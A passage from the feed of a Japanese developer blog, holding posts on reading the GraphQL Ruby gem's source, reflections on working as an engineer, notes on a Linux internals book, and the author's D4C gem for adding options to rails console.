&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FQWYNG%2Felixir_intro" title="QWYNG/elixir_intro" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/QWYNG/elixir_intro">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/GitHub">GitHub&lt;/a>の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/API">API&lt;/a>からisuueとってきてきれいにターミナルに表示するというライブラリ作成ハンズオンまであります。
私的に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%E1%A5%BF%A5%D7%A5%ED%A5%B0%A5%E9%A5%DF%A5%F3%A5%B0">メタプログラミング&lt;/a>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>レベルでいい本かと思ってます。&lt;/p>
&lt;h3>おまけ&lt;/h3>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>-jpでこの本の内容について質問して「訳とか文脈の問題ですかね〜」とかのたまったら訳者である笹田耕一さんに「訳大丈夫ですか」と聞かれて震えました。
（翻訳ありがとうございます！、翻訳のおかげで自分もこの本の内容を少しづつ読み進めることができます:bow:)&lt;/p>
&lt;/body></description></item><item><title>超絶怒涛のゆるふわコードリーディング GraphQL gem篇</title><link>https://qwyng.dev/posts/2019/09/28/194415/</link><pubDate>Sat, 28 Sep 2019 19:44:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/09/28/194415/</guid><description>&lt;body>
&lt;h3>GraphQL gemをふんわり読んだ&lt;/h3>
&lt;p>ふんわり読んで見ました、とりあえずよく使われてそうな&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/DSL">DSL&lt;/a>をおったメモ&lt;br>
versionはv1.9.12 が最新リリースである時期のmasterブランチ読みました。 &lt;br>
ゆるふわの極みです&lt;/p>
&lt;h3>とりあえず最初に公式のGetting Startedで出てくるやつ&lt;/h3>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> module Types
class PostType &amp;lt; Types::BaseObject
field :id, ID, null: false
field :title, String, null: false
field :truncated_preview, String, null: false
field :comments, [Types::CommentType], null: true,
description: "This post's comments, or null if this post has comments disabled."
end
end
&lt;/pre>
&lt;h4>field is 何？&lt;/h4>
&lt;p>GraphQL::Schema::ObjectがextendしてるGraphQL::Schema::Member::HasFieldsのメソッド。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def field(*args, **kwargs, &amp;amp;block)
field_defn = field_class.from_options(*args, owner: self, **kwargs, &amp;amp;block)
add_field(field_defn)
nil
end
&lt;/pre>
&lt;h4>field_class is 何？&lt;/h4>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def field_class(new_field_class = nil)
if new_field_class
@field_class = new_field_class
elsif @field_class
@field_class
elsif self.is_a?(Class)
superclass.respond_to?(:field_class) ? superclass.field_class : GraphQL::Schema::Field
else
ancestor = ancestors[1..-1].find { |a| a.respond_to?(:field_class) &amp;amp;&amp;amp; a.field_class }
ancestor ? ancestor.field_class : GraphQL::Schema::Field
end
end
&lt;/pre>
&lt;p>引数はわたしてないので一個目の分岐は飛ばして、@field_classも（多分素のままだと）設定されてないのでGraphQL::Schema::Fieldか何がしかのクラスが返されているっぽい
GraphQL::Schema::Field.from_optionsはオプションを色々整えた後newして&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>返してくれるメソッド。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def self.from_options(name = nil, type = nil, desc = nil, resolver: nil, mutation: nil, subscription: nil,**kwargs, &amp;amp;block)
&lt;/pre>
&lt;p>引数の数すごい&lt;/p>
&lt;p>最終的に下のコードはGraphQL::Schema::Fieldかサブクラスかなにかの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>作ってると言えそう。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> field_defn = field_class.from_options(*args, owner: self, **kwargs, &amp;amp;block)
&lt;/pre>
&lt;h4>add_field is 何&lt;/h4>
&lt;p>つぎはこの行&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> add_field(field_defn)
&lt;/pre>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def add_field(field_defn)
if CONFLICT_FIELD_NAMES.include?(field_defn.original_name) &amp;amp;&amp;amp; field_defn.original_name == field_defn.resolver_method
warn "#{self.graphql_name}'s `field :#{field_defn.original_name}` conflicts with a built-in method, use `resolver_method:` to pick a different resolver method for this field (for example, `resolver_method: :resolve_#{field_defn.original_name}` and `def resolve_#{field_defn.original_name}`)"
end
own_fields[field_defn.name] = field_defn
nil
end
&lt;/pre>
&lt;p>:context, :object,　:method, :class 書くと警告されるっぽい。
中身はハッシュで名前をキーにしてfield_class.from_optionsでつくった&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>をそのまま突っ込んでる。&lt;/p>
&lt;p>んでこのハッシュは下記の2つのメソッドで使ってるっぽい&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def fields
# Local overrides take precedence over inherited fields
all_fields = {}
ancestors.reverse_each do |ancestor|
if ancestor.respond_to?(:own_fields)
all_fields.merge!(ancestor.own_fields)
end
end
all_fields
end
def get_field(field_name)
if (f = own_fields[field_name])
f
else
for ancestor in ancestors
if ancestor.respond_to?(:own_fields) &amp;amp;&amp;amp; f = ancestor.own_fields[field_name]
return f
end
end
nil
end
end
&lt;/pre>
&lt;h3>多分実行してるときに使ってるコード&lt;/h3>
&lt;p>public_sendしてますね。引数も渡せそう。&lt;br>
オブジェクトがもともとメソッドもってればなんでもフィールドにできる感じなのかな？&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def resolve_field_method(obj, ruby_kwargs, ctx)
if obj.object.is_a?(Hash)
inner_object = obj.object
if inner_object.key?(@method_sym)
inner_object[@method_sym]
else
inner_object[@method_str]
end
elsif obj.object.respond_to?(@method_sym)
if ruby_kwargs.any?
obj.object.public_send(@method_sym, **ruby_kwargs)
else
obj.object.public_send(@method_sym)
end
else
raise &amp;lt;&amp;lt;-ERR
Failed to implement #{@owner.graphql_name}.#{@name}, tried:
- `#{obj.class}##{@resolver_method}`, which did not exist
- `#{obj.object.class}##{@method_sym}`, which did not exist
- Looking up hash key `#{@method_sym.inspect}` or `#{@method_str.inspect}` on `#{obj.object}`, but it wasn't a Hash
To implement this field, define one of the methods above (and check for typos)
ERR
end
end
&lt;/pre>
&lt;p>&lt;del>前半の分岐がよくわからんけど&lt;/del>
@method_symはこんな感じでinitializeされるときに入れてる&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> method_name = method || hash_key || @underscored_name
@method_sym = method_name.to_sym
&lt;/pre>
&lt;h3>まとめ&lt;/h3>
&lt;p>ちょっと読んだ後公式のドキュメントみて使い方知らないとわけわからんことに気づいたのでここで終わりです。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/OSS">OSS&lt;/a>に貢献してる人これ無償で読んで理解して書いてるってすごすぎませんか？？？？？？&lt;/p>
&lt;/body></description></item><item><title>エンジニアとして働いて</title><link>https://qwyng.dev/posts/2019/09/20/024930/</link><pubDate>Fri, 20 Sep 2019 02:49:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/09/20/024930/</guid><description>&lt;body>
&lt;p>エンジニアとして働き初めて半年がたった。まだまだわからないこと、初めて知ることばかりであり、周りの方の助けを借りながらなんとかやっている。 &lt;br>
なんとなく書きたくなったのでエンジニアとして働き初めて感じたこととかをまとめようと思う。&lt;/p>
&lt;h3>エンジニアとして働くことは幸せなこと&lt;/h3>
&lt;p>エンジニアは幸せな仕事だと思う。自分がやっていることと仕事を簡単に結びつけやすい職業だ。仕事を人生にしやすいと感じる。&lt;br>
自分が趣味やら素振りやらで培った技術がすぐに仕事に活かせるし、そうでなくても原理原則をしれば仕事のツールとして絶対に効いてくる。&lt;br>
自分は現在教育分野での開発をしているのだけど、教育とITの相性もいいし教育とエンジニアの相性もとてもいいと思う。学んで試してを繰り返している人がエンジニアは多いように思うし、教育も自走できる人間を育てるのが一番の目指すところだと思う。自分ができなかったことができるようになっていくのも、知らなかったことを知るのも楽しい。&lt;br>
僕は大学までノホホンとしていて自分から学ぶことなんてゲーム以外でしなかったが、プログラミングを学び始めてからは知ることも試すことも全て自分から学びに行っている実感がある。誰に言われるでもなく自分が知りたいことを自分から学びに行くことがこんなに楽しいことだとは知らなかった。ましてやそれが実際に収入に結びつくなんて最高だ。&lt;br>
自分が頑張った分だけ良くなっていくという希望はこの仕事を通して初めて感じた。
転職した理由は身近で仕事を楽しそうに話す人がエンジニアだったという理由だったが間違いではなかったと思う。&lt;/p>
&lt;h3>いわゆる技術と同等に大事だと思うこと&lt;/h3>
&lt;p>ITエンジニアとしての技術力それ自体ももちろん大切だけど、半年働いてみてこれも重要だなぁと思うこともできた。&lt;/p>
&lt;h4>チームの雰囲気を良くしていく力&lt;/h4>
&lt;p>チームの効率を上げたりだとかも重要かもしれないけど、それ以上に雰囲気を和ますというか適度にチャットしたりおしゃべりできるような空気を作る力というのはものすごく大きい思う。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%BF%B4%CD%FD%C5%AA">心理的&lt;/a>安全性というやつだろうか。いつも笑ってるぐらいがちょうどいいと思う。&lt;/p>
&lt;h4>他業種に対する敬意&lt;/h4>
&lt;p>売上を出しているのはコードだけではない。営業の人や方針をきめた経営者やユーザーの声を最初に聞いてくれる人、日々プロダクトとユーザーについて真摯に向き合っている人等大勢の人が総合して売上をだしている。&lt;br>
自分も前職のときは自分の組織が使っているシステムを必死に使っていた。他業種の大変さとかを理解するのは人間がわかりあうのは難しいので難しいが、少なくとも敬意をもって考えを聞く姿勢は常に持っているのが大事だと感じた。みんなそれぞれの考えを持って働いているのだ。&lt;/p>
&lt;h4>人に頼ること&lt;/h4>
&lt;p>わからないことをきちんとわからないということも大切だし、人間が一人でできることには限界があることを認めることも重要だと思う。&lt;br>
自分が余り知らない機能のコードがあったとして、自分でじっくりそのコードを読むこともいいが、その機能に詳しそうな人に伺うという行為をちゃんとすることも大事だと思う。得意でない事を得意な人に聞いている人というのは素晴らしい人だと思う。&lt;/p>
&lt;h3>これから&lt;/h3>
&lt;p>どうなるか知らんけど楽しく働いて行きたい&lt;/p>
&lt;/body></description></item><item><title>「試して理解　Linuxのしくみ」を読んだ</title><link>https://qwyng.dev/posts/2019/08/28/222307/</link><pubDate>Wed, 28 Aug 2019 22:23:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/08/28/222307/</guid><description>&lt;body>
&lt;p>&lt;/p>
&lt;div class="hatena-asin-detail">
&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/477419607X/hatena-blog-22/">&lt;img src="https://images-fe.ssl-images-amazon.com/images/I/51r%2BeNsY2fL._SL160_.jpg" class="hatena-asin-detail-image" alt="[試して理解]Linuxのしくみ ~実験と図解で学ぶOSとハードウェアの基礎知識" title="[試して理解]Linuxのしくみ ~実験と図解で学ぶOSとハードウェアの基礎知識">&lt;/a>&lt;div class="hatena-asin-detail-info">
&lt;p class="hatena-asin-detail-title">&lt;a href="http://www.amazon.co.jp/exec/obidos/ASIN/477419607X/hatena-blog-22/">[試して理解]Linuxのしくみ ~実験と図解で学ぶOSとハードウェアの基礎知識&lt;/a>&lt;/p>
&lt;ul>
&lt;li>
&lt;span class="hatena-asin-detail-label">作者:&lt;/span> 武内覚&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">出版社/メーカー:&lt;/span> &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B5%BB%BD%D1%C9%BE%CF%C0%BC%D2">技術評論社&lt;/a>
&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">発売日:&lt;/span> 2018/02/23&lt;/li>
&lt;li>
&lt;span class="hatena-asin-detail-label">メディア:&lt;/span> 単行本（ソフトカバー）&lt;/li>
&lt;li>&lt;a href="http://d.hatena.ne.jp/asin/477419607X/hatena-blog-22" target="_blank">この商品を含むブログ (1件) を見る&lt;/a>&lt;/li>
&lt;/ul>
&lt;/div>
&lt;div class="hatena-asin-detail-foot">&lt;/div>
&lt;/div>
&lt;h1>読んだ理由&lt;/h1>
&lt;p>せっかく自宅の環境を&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ubuntu">Ubuntu&lt;/a>にしたので&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fsasa5740.hatenablog.com%2Fentry%2F2019%2F07%2F08%2F083000" title="個人開発用マシンをThinkPad X1 Carbon with Ubuntuにしました - Tallman" class="embed-card embed-blogcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 190px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://sasa5740.hatenablog.com/entry/2019/07/08/083000">sasa5740.hatenablog.com&lt;/a>&lt;/cite>&lt;/p>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Linux">Linux&lt;/a>の基本的な知識知りたいなぁと思ったのと、A Tour of Goとか&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>/&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ruby">ruby&lt;/a>の並行テストとか見て並行処理の意味が全くわからんちんだったので、プロセスを詳しく知るために購入した。&lt;/p>
&lt;h1>全体的な感想&lt;/h1>
&lt;p>試して理解ということでサンプルコードがたくさん載っていた。最初は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/GitHub">GitHub&lt;/a>に全部上がってるの知らずにポチポチ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/C%B8%C0%B8%EC">C言語&lt;/a>写経しながら読んでいた。&lt;/p>
&lt;p>実際にハードウェアにアクセスするのが&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AB%A1%BC%A5%CD%A5%EB">カーネル&lt;/a>で、普段僕が書いてるアプリケーションはあくまでプロセスとして&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B7%A5%B9%A5%C6%A5%E0%A5%B3%A1%BC%A5%EB">システムコール&lt;/a>のラッパー関数を呼び出しているだけ、という事&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A4%AB%A4%E9%A4%B7">からし&lt;/a>て初めて知ったので、全編に渡って新しい発見の連続だった。&lt;br>
あと著者の方の環境がメモリ32Gで人権を感じた。&lt;/p>
&lt;h1>要約感想的なもの&lt;/h1>
&lt;h2>　3章&lt;/h2>
&lt;ul>
&lt;li>fork()関数もこの本で初めて知った。webサーバーがなんで同時に複数のリク&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A8%A5%B9">エス&lt;/a>トをさばけるのか少しわかりかけてきた。&lt;/li>
&lt;/ul>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Ftechracho.bpsinc.jp%2Fhachi8833%2F2017_11_13%2F47696" title="Rails: Puma/Unicorn/Passengerの効率を最大化する設定（翻訳）" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://techracho.bpsinc.jp/hachi8833/2017_11_13/47696">techracho.bpsinc.jp&lt;/a>&lt;/cite>&lt;/p>
&lt;p>（この記事の意味がようやく少しわかった。）&lt;/p>
&lt;h2>　4章 プロセススケジューラー&lt;/h2>
&lt;ul>
&lt;li>&lt;p>論理CPU一個が同時に二つプロセス動かすことはない。プロセスは&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%C6%A5%AD%A5%B9%A5%C8%A5%B9%A5%A4%A5%C3%A5%C1">コンテキストスイッチ&lt;/a>でそのプロセス関係なく処理が一旦止まることがありうる。&lt;/p>&lt;/li>
&lt;li>
&lt;p>単位時間あたりの処理量と結果的な処理にかかる時間は&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C8%A5%EC%A1%BC%A5%C9%A5%AA%A5%D5">トレードオフ&lt;/a>&lt;/p>
&lt;h2>　5章　メモリ管理&lt;/h2>
&lt;/li>
&lt;li>&lt;p>メモリアドレスを直接扱うのはプロセスにはまだ早すぎるので仮想アドレスを使う。&lt;/p>&lt;/li>
&lt;li>&lt;p>ページテーブルはルーティングテーブルみたいなもの。コンピュータというのはどこも二分探索にするための工夫が多い気がする。&lt;/p>&lt;/li>
&lt;li>&lt;p>デマンドページング &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B2%BE%C1%DB%A5%E1%A5%E2%A5%EA">仮想メモリ&lt;/a>確保 != 物理メモリ確保&lt;/p>&lt;/li>
&lt;li>&lt;p>copy on write　fork()時にいきなり新しい物理メモリを確保するのではない。 書き込むときに子プロセス用のメモリを確保して書き込む。&lt;/p>&lt;/li>
&lt;li>
&lt;p>ヒュージページ　葉を増やすと枝も増える。&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%B2%BE%C1%DB%A5%E1%A5%E2%A5%EA">仮想メモリ&lt;/a>と物理メモリの関係も増える。単位を大きくして防ぐ。 &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/ubuntu">ubuntu&lt;/a> 19.04ではトランスペ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A2%A5%EC%A5%F3%A5%C8">アレント&lt;/a>ヒュージページのデフォルトはmadvise()だった。&lt;/p>
&lt;h2>　6章　記憶階層&lt;/h2>
&lt;/li>
&lt;li>&lt;p>メモリと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AD%A5%E3%A5%C3%A5%B7%A5%E5%A5%E1%A5%E2%A5%EA">キャッシュメモリ&lt;/a>は違うもの&lt;/p>&lt;/li>
&lt;li>&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AD%A5%E3%A5%C3%A5%B7%A5%E5%A5%E1%A5%E2%A5%EA">キャッシュメモリ&lt;/a>に局所性（実際に使うところ）をいかにおさめるか&lt;/p>&lt;/li>
&lt;li>&lt;p>メモリにキャッシュしたものをダーティにして実際に変更してダーティを解除&lt;/p>&lt;/li>
&lt;li>&lt;p>ページテーブルもCPUにあるTLBで&lt;/p>&lt;/li>
&lt;li>&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Linux">Linux&lt;/a>はファイルを可能な限りページキャッシュしようとするって大規模サービス実践技術入門にもあった気がする。実際有無を比べると早さが違う&lt;/p>&lt;/li>
&lt;li>
&lt;p>write backは自分の環境でも五秒に一回だった。想像の何百倍も間隔長かった。ダーティのまま中断は普通に起こりそう。　&lt;/p>
&lt;h2>　7章　&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%A1%A5%A4%A5%EB%A5%B7%A5%B9%A5%C6%A5%E0">ファイルシステム&lt;/a>
&lt;/h2>
&lt;/li>
&lt;li>&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%A1%A5%A4%A5%EB%A5%B7%A5%B9%A5%C6%A5%E0">ファイルシステム&lt;/a>がないとお前が&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%AB%A1%BC%A5%CD%A5%EB">カーネル&lt;/a>になるしかない&lt;/p>&lt;/li>
&lt;li>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D5%A5%A1%A5%A4%A5%EB%A5%B7%A5%B9%A5%C6%A5%E0">ファイルシステム&lt;/a>でもcopy on write　書き換えるときはコピーする&lt;/p>
&lt;h2>　8章　ストレージデ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%D0%A5%A4%A5%B9">バイス&lt;/a>
&lt;/h2>
&lt;/li>
&lt;li>&lt;p>ファイルは連続あるいは近く&lt;/p>&lt;/li>
&lt;li>&lt;p>連続する領域へのアクセスは一回で&lt;/p>&lt;/li>
&lt;/ul>
&lt;h2>終わりに&lt;/h2>
&lt;p>サンプルコードや実際に手を動かすところが多かったのも良かったけど、解説において過程を飛ばさないで一つ一つ全部図解してくれていたことがありがたかった。&lt;br>
どうやって並行処理の整合性保ってるのかはあんまりわかってない。 子プロセスで書き込みしたらcopy on writeで別の&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%CA%AA%CD%FD%A5%A2%A5%C9%A5%EC%A5%B9">物理アドレス&lt;/a>になってしまうのでは？？？&lt;br>
次は「なるほど&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/UNIX">UNIX&lt;/a>プロセス &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>で学ぶ&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Unix">Unix&lt;/a>の基礎」を買ったのでまた知識の上塗りをしていきたい。&lt;/p>
&lt;/body></description></item><item><title>rails consoleに簡単にオプションを足せるようになるgemを作った</title><link>https://qwyng.dev/posts/2019/08/20/090000/</link><pubDate>Tue, 20 Aug 2019 09:00:00 +0900</pubDate><guid>https://qwyng.dev/posts/2019/08/20/090000/</guid><description>&lt;body>
&lt;p>作ったgemはこれです&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2FQWYNG%2Fd4c" title="QWYNG/D4C" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://github.com/QWYNG/d4c">github.com&lt;/a>&lt;/cite>&lt;/p>
&lt;h2>使い方&lt;/h2>
&lt;p>&lt;code>config/application.rb&lt;/code>に下のようにオプションをセットします。&lt;br>
&lt;code>Rails::Application&lt;/code>の上に書くようにしてください。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> Bundler.require(*Rails.groups)
D4C::Console.add_option 'hello' do
puts "hello"
end
module YourRailsApplication
class Application &amp;lt; Rails::Application
&lt;/pre>
&lt;p>これで&lt;code>rails console&lt;/code>に渡せるオプションを追加できました。実際にオプションが呼ばれると渡したブロックが&lt;code>call&lt;/code>されます。&lt;/p>
&lt;pre class="code bash" data-lang="bash" data-unlink> rails c --hello
Running via Spring preloader in process 7922
hoge
Loading development environment (Rails 5.2.3)
irb(main):001:0&amp;gt; &lt;/pre>
&lt;h2>なんで作ったか&lt;/h2>
&lt;p>&lt;code>rails console&lt;/code>を叩くときに、「デフォルトで実行されたくないけど実行したいときはさっと実行したい」処理があったからです。&lt;br>
職場で&lt;code>act_as_tenant&lt;/code>というgemを使っています。dbのレコードに制限をかけるgemです。&lt;br>
&lt;code>act_as_tenant&lt;/code>の都合上、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/rails">rails&lt;/a> consoleからdbのレコードを叩くには&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> ActsAsTenant.without_tenant do
end
&lt;/pre>
&lt;p>として作業しなくてはなりませんでした。&lt;br>
とはいえ&lt;code>Railtie&lt;/code>の&lt;code>console&lt;/code>メソッドでせっかくかけたセキュリティをデフォルトで外してしまうことはしたくありません。&lt;br>
&lt;code>--sandbox&lt;/code>みたいにオプションで選択できると良いと考え、このgemを作りました。 &lt;sup id="fnref:1">&lt;a href="#fn:1" rel="footnote">1&lt;/a>&lt;/sup>&lt;/p>
&lt;h2>実装の話&lt;/h2>
&lt;h3>そもそも&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/rails">rails&lt;/a> console --sandboxをした時の流れ&lt;/h3>
&lt;p>&lt;code>bin/rails console&lt;/code>自体の具体的な流れは&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>ガイドにとっても詳しく書いてあるので読みましょう。&lt;/p>
&lt;p>&lt;iframe src="https://hatenablog-parts.com/embed?url=https%3A%2F%2Frailsguides.jp%2Finitialization.html" title="Rails の初期化プロセス - Rails ガイド" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;">&lt;/iframe>&lt;cite class="hatena-citation">&lt;a href="https://railsguides.jp/initialization.html">railsguides.jp&lt;/a>&lt;/cite>&lt;/p>
&lt;p>では&lt;code>--sandbox&lt;/code>はどうやって処理されているのでしょうか。
(注 &lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>のコードを載せていますが色々省いています。）&lt;/p>
&lt;p>&lt;code>Rails::Command::ConsoleCommand&lt;/code>クラスは下のようになっています。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> class_option :sandbox, aliases: "-s", type: :boolean, default: false,
desc: "Rollback database modifications on exit."
def perform
Rails::Console.start(Rails.application, options)
end
&lt;/pre>
&lt;p>受け取れる&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%DE%A5%F3%A5%C9%A5%E9%A5%A4%A5%F3">コマンドライン&lt;/a>のオプションを&lt;code>class_option&lt;/code>で追加しています。&lt;br>
&lt;code>Rails::Command::ConsoleCommand&lt;/code>はThorという&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%DE%A5%F3%A5%C9%A5%E9%A5%A4%A5%F3">コマンドライン&lt;/a>ツールの作成を助けるgemを継承しています。&lt;code>class_option&lt;/code>はそのgemのメソッドです。&lt;/p>
&lt;p>&lt;code>Rails::Application&lt;/code>クラス内では&lt;code>--sandbox&lt;/code>が入力されたかを保存できるようにしてあります。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> attr_accessor :assets, :sandbox
&lt;/pre>
&lt;p>&lt;code>Rails::Console&lt;/code>クラスでは、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B3%A5%DE%A5%F3%A5%C9%A5%E9%A5%A4%A5%F3">コマンドライン&lt;/a>から渡されたオプションの有無をアプリケーションの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>に渡しています。&lt;/p>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> def initialize(app, options = {})
@app = app
@options = options
app.sandbox = sandbox?
end
def sandbox?
options[:sandbox]
end
&lt;/pre>
&lt;p>これにより&lt;code>if app.sandbox&lt;/code>で条件分岐できるようになります。&lt;/p>
&lt;h3>実際に&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/D4C">D4C&lt;/a>で行った拡張&lt;/h3>
&lt;pre class="code lang-ruby" data-lang="ruby" data-unlink> module Rails
Application.prepend D4C::PrependOptionAccessor
Console.prepend D4C::PrependOptionSetter
Command::ConsoleCommand.prepend D4C::PrependClassOption
end
&lt;/pre>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/D4C">D4C&lt;/a>のmoduleは&lt;code>D4C::Console.add_option&lt;/code>に渡されたオプションを&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Rails">Rails&lt;/a>のクラスが扱えるようにするものです。 それぞれ&lt;code>prepend&lt;/code>してmoduleの中で&lt;code>super&lt;/code>することで処理を足しています。&lt;br>
&lt;code>D4C::Console&lt;/code>の中身はオプションを構造体にして保存するクラスの&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%B9%A5%BF%A5%F3%A5%B9">インスタンス&lt;/a>です。&lt;/p>
&lt;h2>Gemの名前&lt;/h2>
&lt;p>&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%B8%A5%E7%A5%B8%A5%E7%A4%CE%B4%F1%CC%AF%A4%CA%CB%C1%B8%B1">ジョジョの奇妙な冒険&lt;/a>のスタンド名です。&lt;br>
最初はbaby_faceって名前でした、コンソールなので。&lt;br>
&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A1%A6%A5%E2%A1%BC%A5%EB%A5%C8">ディ・モールト&lt;/a>ベネなgemの名前だと思いながら作成して、いざ公開しようと思ったら同じ名前のgemが既にあって泣きました。皆さんはこうならないようにちゃんと&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/rubygems">rubygems&lt;/a>で名前を検索してから作りましょう。&lt;br>
最終的にたやすくオプションを足せるってところから&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/D4C">D4C&lt;/a>にしました。&lt;br>
最後にこれが一番書きたかったんですけど、&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/D4C">D4C&lt;/a>ってまさに「&lt;a class="keyword" href="http://d.hatena.ne.jp/keyword/Ruby">Ruby&lt;/a>」だと思うんですよね。&lt;/p>
&lt;p>&lt;span itemscope itemtype="http://schema.org/Photograph">&lt;img src="https://cdn-ak.f.st-hatena.com/images/fotolife/s/sasa5740/20190819/20190819222624.png" alt="f:id:sasa5740:20190819222624p:plain" title="f:id:sasa5740:20190819222624p:plain" class="hatena-fotolife" itemprop="image">&lt;/span>&lt;/p>
&lt;div class="footnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1">
